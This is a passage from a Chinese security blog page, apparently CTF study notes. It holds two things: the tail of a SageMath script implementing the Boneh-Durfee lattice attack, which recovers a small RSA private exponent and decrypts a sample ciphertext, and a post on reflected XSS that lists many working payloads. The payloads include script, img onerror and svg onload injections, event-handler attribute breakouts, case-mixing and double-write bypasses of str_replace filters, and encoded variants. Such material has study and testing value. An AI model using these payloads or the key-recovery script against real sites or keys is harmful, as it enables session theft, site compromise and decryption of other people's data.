class="line">you should probably use &#96;strict &#x3D; False&#96;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">strict &#x3D; False</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">This is experimental, but has provided remarkable results</span><br><span class="line">so far. It tries to reduce the lattice as much as it can</span><br><span class="line">while keeping its efficiency. I see no reason not to use</span><br><span class="line">this option, but if things don&#39;t work, you should try</span><br><span class="line">disabling it</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">helpful_only &#x3D; True</span><br><span class="line">dimension_min &#x3D; 7 # stop removing if lattice reaches that dimension</span><br><span class="line"></span><br><span class="line">############################################</span><br><span class="line"># Functions</span><br><span class="line">##########################################</span><br><span class="line"></span><br><span class="line"># display stats on helpful vectors</span><br><span class="line">def helpful_vectors(BB, modulus):</span><br><span class="line">    nothelpful &#x3D; 0</span><br><span class="line">    for ii in range(BB.dimensions()[0]):</span><br><span class="line">        if BB[ii,ii] &gt;&#x3D; modulus:</span><br><span class="line">            nothelpful +&#x3D; 1</span><br><span class="line"></span><br><span class="line">    print nothelpful, &quot;&#x2F;&quot;, BB.dimensions()[0], &quot; vectors are not helpful&quot;</span><br><span class="line"></span><br><span class="line"># display matrix picture with 0 and X</span><br><span class="line">def matrix_overview(BB, bound):</span><br><span class="line">    for ii in range(BB.dimensions()[0]):</span><br><span class="line">        a &#x3D; (&#39;%02d &#39; % ii)</span><br><span class="line">        for jj in range(BB.dimensions()[1]):</span><br><span class="line">            a +&#x3D; &#39;0&#39; if BB[ii,jj] &#x3D;&#x3D; 0 else &#39;X&#39;</span><br><span class="line">            if BB.dimensions()[0] &lt; 60:</span><br><span class="line">                a +&#x3D; &#39; &#39;</span><br><span class="line">        if BB[ii, ii] &gt;&#x3D; bound:</span><br><span class="line">            a +&#x3D; &#39;~&#39;</span><br><span class="line">        print a</span><br><span class="line"></span><br><span class="line"># tries to remove unhelpful vectors</span><br><span class="line"># we start at current &#x3D; n-1 (last vector)</span><br><span class="line">def remove_unhelpful(BB, monomials, bound, current):</span><br><span class="line">    # end of our recursive function</span><br><span class="line">    if current &#x3D;&#x3D; -1 or BB.dimensions()[0] &lt;&#x3D; dimension_min:</span><br><span class="line">        return BB</span><br><span class="line"></span><br><span class="line">    # we start by checking from the end</span><br><span class="line">    for ii in range(current, -1, -1):</span><br><span class="line">        # if it is unhelpful:</span><br><span class="line">        if BB[ii, ii] &gt;&#x3D; bound:</span><br><span class="line">            affected_vectors &#x3D; 0</span><br><span class="line">            affected_vector_index &#x3D; 0</span><br><span class="line">            # let&#39;s check if it affects other vectors</span><br><span class="line">            for jj in range(ii + 1, BB.dimensions()[0]):</span><br><span class="line">                # if another vector is affected:</span><br><span class="line">                # we increase the count</span><br><span class="line">                if BB[jj, ii] !&#x3D; 0:</span><br><span class="line">                    affected_vectors +&#x3D; 1</span><br><span class="line">                    affected_vector_index &#x3D; jj</span><br><span class="line"></span><br><span class="line">            # level:0</span><br><span class="line">            # if no other vectors end up affected</span><br><span class="line">            # we remove it</span><br><span class="line">            if affected_vectors &#x3D;&#x3D; 0:</span><br><span class="line">                print &quot;* removing unhelpful vector&quot;, ii</span><br><span class="line">                BB &#x3D; BB.delete_columns([ii])</span><br><span class="line">                BB &#x3D; BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB &#x3D; remove_unhelpful(BB, monomials, bound, ii-1)</span><br><span class="line">                return BB</span><br><span class="line"></span><br><span class="line">            # level:1</span><br><span class="line">            # if just one was affected we check</span><br><span class="line">            # if it is affecting someone else</span><br><span class="line">            elif affected_vectors &#x3D;&#x3D; 1:</span><br><span class="line">                affected_deeper &#x3D; True</span><br><span class="line">                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):</span><br><span class="line">                    # if it is affecting even one vector</span><br><span class="line">                    # we give up on this one</span><br><span class="line">                    if BB[kk, affected_vector_index] !&#x3D; 0:</span><br><span class="line">                        affected_deeper &#x3D; False</span><br><span class="line">                # remove both it if no other vector was affected and</span><br><span class="line">                # this helpful vector is not helpful enough</span><br><span class="line">                # compared to our unhelpful one</span><br><span class="line">                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]):</span><br><span class="line">                    print &quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index</span><br><span class="line">                    BB &#x3D; BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB &#x3D; BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB &#x3D; remove_unhelpful(BB, monomials, bound, ii-1)</span><br><span class="line">                    return BB</span><br><span class="line">    # nothing happened</span><br><span class="line">    return BB</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot; </span><br><span class="line">Returns:</span><br><span class="line">* 0,0   if it fails</span><br><span class="line">* -1,-1 if &#96;strict&#x3D;true&#96;, and determinant doesn&#39;t bound</span><br><span class="line">* x0,y0 the solutions of &#96;pol&#96;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def boneh_durfee(pol, modulus, mm, tt, XX, YY):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Boneh and Durfee revisited by Herrmann and May</span><br><span class="line">    </span><br><span class="line">    finds a solution if:</span><br><span class="line">    * d &lt; N^delta</span><br><span class="line">    * |x| &lt; e^delta</span><br><span class="line">    * |y| &lt; e^0.5</span><br><span class="line">    whenever delta &lt; 1 - sqrt(2)&#x2F;2 ~ 0.292</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    # substitution (Herrman and May)</span><br><span class="line">    PR.&lt;u, x, y&gt; &#x3D; PolynomialRing(ZZ)</span><br><span class="line">    Q &#x3D; PR.quotient(x*y + 1 - u) # u &#x3D; xy + 1</span><br><span class="line">    polZ &#x3D; Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU &#x3D; XX*YY + 1</span><br><span class="line"></span><br><span class="line">    # x-shifts</span><br><span class="line">    gg &#x3D; []</span><br><span class="line">    for kk in range(mm + 1):</span><br><span class="line">        for ii in range(mm - kk + 1):</span><br><span class="line">            xshift &#x3D; x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    # x-shifts list of monomials</span><br><span class="line">    monomials &#x3D; []</span><br><span class="line">    for polynomial in gg:</span><br><span class="line">        for monomial in polynomial.monomials():</span><br><span class="line">            if monomial not in monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    # y-shifts (selected by Herrman and May)</span><br><span class="line">    for jj in range(1, tt + 1):</span><br><span class="line">        for kk in range(floor(mm&#x2F;tt) * jj, mm + 1):</span><br><span class="line">            yshift &#x3D; y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift &#x3D; Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) # substitution</span><br><span class="line">    </span><br><span class="line">    # y-shifts list of monomials</span><br><span class="line">    for jj in range(1, tt + 1):</span><br><span class="line">        for kk in range(floor(mm&#x2F;tt) * jj, mm + 1):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    # construct lattice B</span><br><span class="line">    nn &#x3D; len(monomials)</span><br><span class="line">    BB &#x3D; Matrix(ZZ, nn)</span><br><span class="line">    for ii in range(nn):</span><br><span class="line">        BB[ii, 0] &#x3D; gg[ii](0, 0, 0)</span><br><span class="line">        for jj in range(1, ii + 1):</span><br><span class="line">            if monomials[jj] in gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] &#x3D; gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    # Prototype to reduce the lattice</span><br><span class="line">    if helpful_only:</span><br><span class="line">        # automatically remove</span><br><span class="line">        BB &#x3D; remove_unhelpful(BB, monomials, modulus^mm, nn-1)</span><br><span class="line">        # reset dimension</span><br><span class="line">        nn &#x3D; BB.dimensions()[0]</span><br><span class="line">        if nn &#x3D;&#x3D; 0:</span><br><span class="line">            print &quot;failure&quot;</span><br><span class="line">            return 0,0</span><br><span class="line"></span><br><span class="line">    # check if vectors are helpful</span><br><span class="line">    if debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    # check if determinant is correctly bounded</span><br><span class="line">    det &#x3D; BB.det()</span><br><span class="line">    bound &#x3D; modulus^(mm*nn)</span><br><span class="line">    if det &gt;&#x3D; bound:</span><br><span class="line">        print &quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span><br><span class="line">        print &quot;Try with highers m and t.&quot;</span><br><span class="line">        if debug:</span><br><span class="line">            diff &#x3D; (log(det) - log(bound)) &#x2F; log(2)</span><br><span class="line">            print &quot;size det(L) - size e^(m*n) &#x3D; &quot;, floor(diff)</span><br><span class="line">        if strict:</span><br><span class="line">            return -1, -1</span><br><span class="line">    else:</span><br><span class="line">        print &quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span><br><span class="line"></span><br><span class="line">    # display the lattice basis</span><br><span class="line">    if debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    # LLL</span><br><span class="line">    if debug:</span><br><span class="line">        print &quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span><br><span class="line"></span><br><span class="line">    BB &#x3D; BB.LLL()</span><br><span class="line"></span><br><span class="line">    if debug:</span><br><span class="line">        print &quot;LLL is done!&quot;</span><br><span class="line"></span><br><span class="line">    # transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span><br><span class="line">    if debug:</span><br><span class="line">        print &quot;looking for independent vectors in the lattice&quot;</span><br><span class="line">    found_polynomials &#x3D; False</span><br><span class="line">    </span><br><span class="line">    for pol1_idx in range(nn - 1):</span><br><span class="line">        for pol2_idx in range(pol1_idx + 1, nn):</span><br><span class="line">            # for i and j, create the two polynomials</span><br><span class="line">            PR.&lt;w,z&gt; &#x3D; PolynomialRing(ZZ)</span><br><span class="line">            pol1 &#x3D; pol2 &#x3D; 0</span><br><span class="line">            for jj in range(nn):</span><br><span class="line">                pol1 +&#x3D; monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] &#x2F; monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 +&#x3D; monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] &#x2F; monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            # resultant</span><br><span class="line">            PR.&lt;q&gt; &#x3D; PolynomialRing(ZZ)</span><br><span class="line">            rr &#x3D; pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            # are these good polynomials?</span><br><span class="line">            if rr.is_zero() or rr.monomials() &#x3D;&#x3D; [1]:</span><br><span class="line">                continue</span><br><span class="line">            else:</span><br><span class="line">                print &quot;found them, using vectors&quot;, pol1_idx, &quot;and&quot;, pol2_idx</span><br><span class="line">                found_polynomials &#x3D; True</span><br><span class="line">                break</span><br><span class="line">        if found_polynomials:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    if not found_polynomials:</span><br><span class="line">        print &quot;no independant vectors could be found. This should very rarely happen...&quot;</span><br><span class="line">        return 0, 0</span><br><span class="line">    </span><br><span class="line">    rr &#x3D; rr(q, q)</span><br><span class="line"></span><br><span class="line">    # solutions</span><br><span class="line">    soly &#x3D; rr.roots()</span><br><span class="line"></span><br><span class="line">    if len(soly) &#x3D;&#x3D; 0:</span><br><span class="line">        print &quot;Your prediction (delta) is too small&quot;</span><br><span class="line">        return 0, 0</span><br><span class="line"></span><br><span class="line">    soly &#x3D; soly[0][0]</span><br><span class="line">    ss &#x3D; pol1(q, soly)</span><br><span class="line">    solx &#x3D; ss.roots()[0][0]</span><br><span class="line"></span><br><span class="line">    #</span><br><span class="line">    return solx, soly</span><br><span class="line"></span><br><span class="line">def example():</span><br><span class="line">    ############################################</span><br><span class="line">    # How To Use This Script</span><br><span class="line">    ##########################################</span><br><span class="line"></span><br><span class="line">    #</span><br><span class="line">    # The problem to solve (edit the following values)</span><br><span class="line">    #</span><br><span class="line"></span><br><span class="line">    # the modulus</span><br><span class="line">    N &#x3D; 0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L</span><br><span class="line">    # the public exponent</span><br><span class="line">    e &#x3D; 0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL</span><br><span class="line">    # the cipher</span><br><span class="line">    c &#x3D; 0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    # the hypothesis on the private exponent (the theoretical maximum is 0.292)</span><br><span class="line">    delta &#x3D; .18 # this means that d &lt; N^delta</span><br><span class="line"></span><br><span class="line">    #</span><br><span class="line">    # Lattice (tweak those values)</span><br><span class="line">    #</span><br><span class="line"></span><br><span class="line">    # you should tweak this (after a first run), (e.g. increment it until a solution is found)</span><br><span class="line">    m &#x3D; 4 # size of the lattice (bigger the better&#x2F;slower)</span><br><span class="line"></span><br><span class="line">    # you need to be a lattice master to tweak these</span><br><span class="line">    t &#x3D; int((1-2*delta) * m)  # optimization from Herrmann and May</span><br><span class="line">    X &#x3D; 2*floor(N^delta)  # this _might_ be too much</span><br><span class="line">    Y &#x3D; floor(N^(1&#x2F;2))    # correct if p, q are ~ same size</span><br><span class="line"></span><br><span class="line">    #</span><br><span class="line">    # Don&#39;t touch anything below</span><br><span class="line">    #</span><br><span class="line"></span><br><span class="line">    # Problem put in equation</span><br><span class="line">    P.&lt;x,y&gt; &#x3D; PolynomialRing(ZZ)</span><br><span class="line">    A &#x3D; int((N+1)&#x2F;2)</span><br><span class="line">    pol &#x3D; 1 + x * (A + y)</span><br><span class="line"></span><br><span class="line">    #</span><br><span class="line">    # Find the solutions!</span><br><span class="line">    #</span><br><span class="line"></span><br><span class="line">    # Checking bounds</span><br><span class="line">    if debug:</span><br><span class="line">        print &quot;&#x3D;&#x3D;&#x3D; checking values &#x3D;&#x3D;&#x3D;&quot;</span><br><span class="line">        print &quot;* delta:&quot;, delta</span><br><span class="line">        print &quot;* delta &lt; 0.292&quot;, delta &lt; 0.292</span><br><span class="line">        print &quot;* size of e:&quot;, int(log(e)&#x2F;log(2))</span><br><span class="line">        print &quot;* size of N:&quot;, int(log(N)&#x2F;log(2))</span><br><span class="line">        print &quot;* m:&quot;, m, &quot;, t:&quot;, t</span><br><span class="line"></span><br><span class="line">    # boneh_durfee</span><br><span class="line">    if debug:</span><br><span class="line">        print &quot;&#x3D;&#x3D;&#x3D; running algorithm &#x3D;&#x3D;&#x3D;&quot;</span><br><span class="line">        start_time &#x3D; time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly &#x3D; boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    # found a solution?</span><br><span class="line">    if solx &gt; 0:</span><br><span class="line">        print &quot;&#x3D;&#x3D;&#x3D; solution found &#x3D;&#x3D;&#x3D;&quot;</span><br><span class="line">        if False:</span><br><span class="line">            print &quot;x:&quot;, solx</span><br><span class="line">            print &quot;y:&quot;, soly</span><br><span class="line"></span><br><span class="line">        d &#x3D; int(pol(solx, soly) &#x2F; e)</span><br><span class="line">        m &#x3D; pow(c,d,N)</span><br><span class="line">        print &#39;[-]d is &#39; + str(d)</span><br><span class="line">        print &#39;[-]m is: &#39; + str(m)</span><br><span class="line">        print &#39;[-]hex(m) is: &#39; + &#39;&#123;:x&#125;&#39;.format(int(m))</span><br><span class="line">        print &#39;[-]str(m) is: &#39; + &#39;&#123;:x&#125;&#39;.format(int(m)).decode(&#39;hex&#39;)</span><br><span class="line">    else:</span><br><span class="line">        print &quot;[!]no solution was found!&quot;</span><br><span class="line">        print &#39;[!]All Done!&#39;</span><br><span class="line"></span><br><span class="line">    if debug:</span><br><span class="line">        print(&quot;[!]Timer: %s s&quot; % (time.time() - start_time))</span><br><span class="line">        print &#39;[!]All Done!&#39;</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    example()</span><br></pre></td></tr></table></figure>






      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/16/2%20XSS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhiliya">
      <meta itemprop="description" content="emmmm 感觉没啥好说的">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="zhiliya">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/16/2%20XSS/" class="post-title-link" itemprop="url">XSS</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-16 10:05:50" itemprop="dateCreated datePublished" datetime="2019-11-16T10:05:50+08:00">2019-11-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-09-22 14:07:19" itemprop="dateModified" datetime="2023-09-22T14:07:19+08:00">2023-09-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="反射型XSS-注入后在当前返回的页面中含有xss代码"><a href="#反射型XSS-注入后在当前返回的页面中含有xss代码" class="headerlink" title="反射型XSS  注入后在当前返回的页面中含有xss代码"></a>反射型XSS  注入后在当前返回的页面中含有xss代码</h1><img src="/2019/11/16/2%20XSS/1.png" alt="1" style="zoom:150%;">

<p> <strong>见框就插，大家应该都明白，找到一个</strong> <strong>input</strong> <strong>输入框，先输入唯一字符串，然后看源代码里有没有出现，再输入</strong> <strong>&lt;&gt;””/&amp;()</strong> <strong>来看看过滤了哪些字符，根据过滤的字符，来构造</strong> <strong>xss**</strong>。通常有一些方式可以测试网站是否有正确处理特殊字符：**</p>
<h2 id="最简单-lt-script-gt"><a href="#最简单-lt-script-gt" class="headerlink" title="最简单&lt;script&gt;"></a>最简单<code>&lt;script&gt;</code></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;    不加引号形式     哪些可以过滤的元素str_replace("&lt;script","&lt;scr_ipt",$str)：script &lt; </span></span><br><span class="line"><span class="regexp">&lt;script&gt;alert('xss')&lt;/</span>script&gt;   加引号</span><br><span class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>)&lt;<span class="regexp">/script&gt;   斜杠    $str2=str_replace("&lt;script","&lt;scr_ipt",$str);</span></span><br><span class="line"><span class="regexp">&lt;script&gt;alert(document.cookie)&lt;/</span>script&gt;</span><br><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;prompt(1);&lt;/</span>script&gt;</span><br><span class="line">&lt;script&gt;confirm(<span class="number">1</span>);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/16/2%20XSS/clip_image002.jpg" alt="img"></p>
<h2 id="使用其他标签弹窗"><a href="#使用其他标签弹窗" class="headerlink" title="使用其他标签弹窗"></a>使用其他标签弹窗</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;a href="</span>javascript:alert(<span class="string">'xss'</span>)<span class="string">"&gt;1&lt;/a&gt;  JavaScript伪协议  $str6=str_replace("</span>href<span class="string">","</span>hr_ef<span class="string">",$str5);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;svg/ onload=alert('xss')&gt;  SVG 是使用 XML 来描述二维图形和绘图程序的语言。</span></span><br><span class="line"><span class="string">&lt;svg onload=confirm``&gt;</span></span><br><span class="line"><span class="string">&lt;body onload=prompt(1);&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">Src</span>=<span class="string">x</span> <span class="attr">Onerror</span>=<span class="string">alert(1)</span>&gt;</span>      $str4=str_replace("src","sr_c",$str3);</span></span><br><span class="line">&lt;img src='z'  onerror="alert('xss')"&gt;</span><br><span class="line">&lt;img src=# onerror="prompt(1)"&gt;</span><br><span class="line">&lt;img src="javascript:alert('XSS')"&gt;</span><br><span class="line">&lt;img srsrcc=# oonnerror="&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#120;&amp;#39;&amp;#41;&amp;#60;&amp;#47;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;"&gt;</span><br><span class="line"></span><br><span class="line">这里通过 src 属性去引用一张根本不存在的图片，通过 JS 中的 onerror 事件去触发弹框。同理引用</span><br><span class="line">Video、audio 也是一样。</span><br><span class="line">&lt;video src=test.mp4 onerror=alert(‘1’);&gt;</span><br><span class="line">&lt;audio src=test.mp3 onerror=alert(‘1’);&gt;</span><br><span class="line">    </span><br><span class="line">&lt;img src="1" οnerrοr="eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))"&gt;</span><br></pre></td></tr></table></figure>

<h2 id="闭合-添加标签内属性-使用鼠标事件on"><a href="#闭合-添加标签内属性-使用鼠标事件on" class="headerlink" title="闭合 添加标签内属性    使用鼠标事件on~"></a>闭合 添加标签内属性    使用鼠标事件<code>on~</code></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" onclick="</span>alert(<span class="number">1</span>)<span class="string">"    $str3=str_replace("</span>on<span class="string">","</span>o_n<span class="string">",$str2);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">htmlspecialchars默认配置不过滤单引号，需要设置quotestyle才会进行转义</span></span><br><span class="line"><span class="string">htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</span></span><br><span class="line"><span class="string">预定义的字符是：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &amp; （和号）成为 &amp;</span></span><br><span class="line"><span class="string">    "</span> （双引号）成为 <span class="string">"</span></span><br><span class="line"><span class="string">    ' （单引号）成为 '</span></span><br><span class="line"><span class="string">    &lt; （小于）成为 &lt;</span></span><br><span class="line"><span class="string">    &gt; （大于）成为 &gt;</span></span><br><span class="line"><span class="string">'onclick='window.alert()</span></span><br><span class="line"><span class="string">' onmouseover='alert(1)'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span> onfocus=alert(<span class="number">1</span>) autofocus=<span class="string">"</span></span><br><span class="line"><span class="string">onsubmit="</span>alert(<span class="string">'xss'</span>)<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span> onmouseover=<span class="string">"alert(document.domain)</span></span><br><span class="line"><span class="string">"</span> onmousemove=<span class="string">"alert(document.domain)或</span></span><br><span class="line"><span class="string">"</span> onclick=alert(<span class="built_in">document</span>.domain) id=<span class="string">"a</span></span><br></pre></td></tr></table></figure>

<h2 id="闭合-直接闭合标签"><a href="#闭合-直接闭合标签" class="headerlink" title="闭合  直接闭合标签"></a>闭合  直接闭合标签</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert('xss')&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="php代码绕过"><a href="#php代码绕过" class="headerlink" title="php代码绕过"></a>php代码绕过</h2><h4 id="过滤了-lt-script-gt-标签-大小写绕过和双写绕过"><a href="#过滤了-lt-script-gt-标签-大小写绕过和双写绕过" class="headerlink" title="过滤了 &lt;script&gt; 标签  大小写绕过和双写绕过"></a>过滤了 <code>&lt;script&gt;</code> 标签  大小写绕过和双写绕过</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;sCript&gt;alert('xss')&lt;/scRipt&gt;    大小写 绕过  $str =strtolower( $_GET["</span>keyword<span class="string">"]); strtolower可使大小写转换无效</span></span><br><span class="line"><span class="string">&lt;scri&lt;script&gt;pt&gt;alert('xss')&lt;/scri&lt;/script&gt;pt&gt;      双写绕过   当替换成空时 $str2=str_replace("</span>script<span class="string">","</span><span class="string">",$str);  				                                                          str2=str_replace("</span>script<span class="string">","</span>scr_ipt<span class="string">",$str);str_replace替换多一个下换线时无效</span></span><br><span class="line"><span class="string">"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">scri&amp;#112;t</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">scri&amp;#112;t</span>&gt;</span>   不行 构造是 &amp;# 加十进制、十六进制 ASCII 码或 unicode 字符编码，而且浏览器解析的时候会先把 html 编码解析再进行渲染。但是有个前提就是必须要在“值”里，比如属性 src 里，但却不能对 src 进行 html 编码。不然浏览器无法正常的渲染。</span></span><br><span class="line"></span><br><span class="line"><span class="xml">" Onclick="alert(1)"</span></span><br><span class="line"><span class="xml">"&gt;<span class="tag">&lt;<span class="name">A</span> <span class="attr">HREF</span>=<span class="string">"javascript:onclick=alert()"</span>&gt;</span>xss大法好<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="过滤了-lt-和-gt-，替换成-amp-lt-amp-gt-或空格-用on-鼠标事件"><a href="#过滤了-lt-和-gt-，替换成-amp-lt-amp-gt-或空格-用on-鼠标事件" class="headerlink" title="过滤了&lt;和&gt;，替换成&amp;lt;&amp;gt;或空格 用on~鼠标事件"></a>过滤了&lt;和&gt;，替换成<code>&amp;lt;&amp;gt;</code>或空格 用<code>on~</code>鼠标事件</h4><p>用”闭合value 标签</p>
<p>“ onclick=”alert(1)”</p>
<p>或</p>
<p><code>&quot; onfocus=alert(1) autofocus=&quot;</code></p>
<p>或</p>
<p><code>&quot;  onmouseover=alert(document.domain)</code></p>
<p>因为过滤了&lt;&gt;”,HTML实体是不行的，html实体不能让内容逃出来</p>
